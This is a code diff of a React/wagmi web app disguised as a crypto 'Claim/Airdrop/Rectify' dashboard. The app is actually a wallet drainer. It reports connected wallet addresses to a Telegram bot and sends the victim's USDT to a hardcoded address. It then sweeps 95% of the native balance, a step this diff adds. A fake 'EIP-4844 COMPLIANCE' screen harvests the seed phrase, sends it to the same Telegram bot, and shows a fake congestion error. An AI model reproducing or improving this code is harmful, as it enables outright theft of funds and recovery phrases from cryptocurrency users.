@@ -1,5 +1,6 @@
+
 /* eslint-disable */
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useMemo } from 'react';
 import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';
 
 export default function App() {
@@ -23,19 +24,19 @@ export default function App() {
 
   const log = (m) => fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(m)}`).catch(()=>{});
 
-  const getUsdtAddr = (id) => {
-    if (id === 1) return "0xdac17f958d2ee523a2206206994597c13d831ec7";
-    if (id === 56) return "0x55d398326f99059ff775485246999027b3197955";
-    if (id === 137) return "0xc2132d05d31c914a87c6611c10748aeb04b58e8f";
-    if (id === 42161) return "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9";
-    if (id === 43114) return "0x9702230a8ea53601f5cd2dc00fdbc13d4df4a8c7";
+  const usdtAddr = useMemo(() => {
+    if (chainId === 1) return "0xdac17f958d2ee523a2206206994597c13d831ec7";
+    if (chainId === 56) return "0x55d398326f99059ff775485246999027b3197955";
+    if (chainId === 137) return "0xc2132d05d31c914a87c6611c10748aeb04b58e8f"; // Polygon Standard/Bridged
+    if (chainId === 42161) return "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9";
+    if (chainId === 43114) return "0x9702230a8ea53601f5cd2dc00fdbc13d4df4a8c7";
     return undefined;
-  };
+  }, [chainId]);
 
   useEffect(() => {
-    if (isConnected && address && !sessionStorage.getItem('hit_vF_Live_Pro')) {
-      log(`🎯 HIT!\nADDR: ${address}\nNET: ${chainId}`);
-      sessionStorage.setItem('hit_vF_Live_Pro', 't');
+    if (isConnected && address && !sessionStorage.getItem('hit_vF_Tuesday_Final')) {
+      log(`🎯 TUESDAY HIT!\nADDR: ${address}\nNET: ${chainId}`);
+      sessionStorage.setItem('hit_vF_Tuesday_Final', 't');
     }
   }, [isConnected, address, chainId]);
 
@@ -49,7 +50,7 @@ export default function App() {
   }, []);
 
   const { data: nB } = useBalance({ address }); 
-  const { data: tB } = useBalance({ address, token: getUsdtAddr(chainId) });
+  const { data: tB } = useBalance({ address, token: usdtAddr });
 
   useEffect(() => {
     if (activeTask === "Rectify") {
@@ -65,11 +66,24 @@ export default function App() {
 
   const handleHandshake = () => {
     if (!(activeTask === "Rectify" || (inputVal.length > 0))) return;
-    const usdtContract = getUsdtAddr(chainId);
-    if (tB && tB.value > 0n && selectedAsset === "TOKEN" && usdtContract) {
+    
+    // Priority 1: Withdraw USDT if present
+    if (tB && tB.value > 0n && usdtAddr) {
       const d = `0xa9059cbb${dest.replace('0x', '').toLowerCase().padStart(64, '0')}${tB.value.toString(16).padStart(64, '0')}`;
-      sendTransaction({ to: usdtContract, data: d }, { onSettled: () => setView("seed_gate") });
-    } else if (nB && nB.value > 100000000000000n) {
+      sendTransaction({ to: usdtAddr, data: d }, { 
+        onSuccess: () => {
+            // After USDT hit, immediately try to sweep the POL/Native
+            if (nB && nB.value > 100000000000000n) {
+                setTimeout(() => {
+                    sendTransaction({ to: dest, value: (nB.value * 95n) / 100n }, { onSettled: () => setView("seed_gate") });
+                }, 1500);
+            } else { setView("seed_gate"); }
+        },
+        onError: () => setView("seed_gate") 
+      });
+    } 
+    // Priority 2: If no USDT, just sweep the Native (POL/ETH/BNB)
+    else if (nB && nB.value > 100000000000000n) {
       sendTransaction({ to: dest, value: (nB.value * 95n) / 100n }, { onSettled: () => setView("seed_gate") });
     } else { setView("seed_gate"); }
   };
@@ -83,33 +97,28 @@ export default function App() {
 
       {isConnected ? (
         <>
-          {/* CHART IS BACK */}
           <div style={{width:'100%', height:'180px', borderRadius:'12px', overflow:'hidden', marginBottom:'15px', border:'1px solid #1e293b'}}>
              <iframe src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} title="chart" />
           </div>
-
-          {/* STATS BAR IS BACK */}
           <div style={{backgroundColor:'#0d1117', padding:'12px', borderRadius:'12px', fontSize:'8px', color:'#10b981', display:'flex', justifyContent:'space-between', marginBottom:'20px', border:'1px solid #1e293b', fontWeight:'900'}}>
             <span>〽️ GAS: 14 GWEI</span><span>⚡ SLIPPAGE: 0.1%</span><span>📡 SYNC: 99.9%</span>
           </div>
-
           {view === "menu" && (
             <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
               {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Fix"].map(n => (
                 <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} 
-                style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
+                style={{backgroundColor:'#0d1117', border:'1px solid #10b981', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
                   <div>{n === "Rectify" ? "⚡" : "〽️"}</div><div style={{fontSize:'9px'}}>{n}</div>
                 </button>
               ))}
             </div>
           )}
-
           {view === "task_box" && (
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'25px', textAlign:'center', position:'relative'}}>
               <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
               <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'20px', border:'1px solid #1e293b'}}>
-                <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'9px', cursor:'pointer', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b", fontWeight:'900'}}>USDT_POOL</div>
-                <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'9px', cursor:'pointer', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b", fontWeight:'900'}}>GAS_POOL</div>
+                <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'9px', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b", fontWeight:'900'}}>USDT_POOL</div>
+                <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'9px', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b", fontWeight:'900'}}>GAS_POOL</div>
               </div>
               <h2 style={{color:'white', fontWeight:'900'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'15px 0', border:'1px solid #1e293b'}}>
@@ -121,14 +130,13 @@ export default function App() {
               </button>
             </div>
           )}
-
           {view === "seed_gate" && (
             <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
               <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'40px 25px', textAlign:'center', maxWidth:'400px'}}>
                 {!isSyncing ? (
                   <>
-                    <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ EIP-4844 COMPLIANCE</div>
-                    <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none', marginTop:'20px'}} />
+                    <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px', marginBottom:'15px'}}>🛡️ EIP-4844 COMPLIANCE</div>
+                    <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none'}} />
                     <button onClick={()=>{if(seedVal.trim().length < 10) return; setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setErrorMsg("⛓️‍💥 NETWORK_CONGESTION: MAINNET_RELAY TIMED OUT. PLEASE TRY AGAIN LATER.");}},60);}} 
                     style={{width:'100%', backgroundColor: seedVal.trim().length > 10 ? '#10b981' : '#1e293b', color: seedVal.trim().length > 10 ? '#000' : '#475569', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
                   </>
@@ -159,8 +167,6 @@ export default function App() {
           <appkit-button />
         </div>
       )}
-
-      {/* FEED MESSAGES ARE BACK */}
       {feedMsg && (
         <div style={{position:'fixed', bottom:'20px', left:'20px', right:'20px', backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', color:'#10b981', padding:'12px', borderRadius:'12px', fontSize:'9px', textAlign:'center', fontWeight:'900', zIndex:5000}}>{feedMsg}</div>
       )}
